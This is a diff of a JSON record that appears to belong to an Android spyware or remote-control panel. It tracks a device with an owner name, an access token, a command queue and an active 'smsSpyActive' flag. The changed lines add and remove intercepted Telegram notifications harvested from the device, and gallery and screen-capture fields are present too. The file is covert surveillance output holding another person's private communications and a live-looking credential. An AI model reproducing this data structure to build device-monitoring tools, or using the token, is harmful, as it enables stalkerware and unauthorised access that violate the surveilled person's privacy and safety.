@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777068278663,
+    "lastSeen": 1777068305666,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5730 pesan baru dari 51 obrolan",
+        "time": "25/04 05:05",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777068307003
+      },
       {
         "appName": "Telegram",
         "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
@@ -4011,14 +4019,6 @@
         "time": "25/04 03:20",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1777062007201
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
-        "content": "⏳ [AUTO-CHECK CPU] - V1\n\nMemulai pengecekan. Mohon tunggu...",
-        "time": "25/04 03:20",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1777062007196
       }
     ],
     "galleryPhotos": [
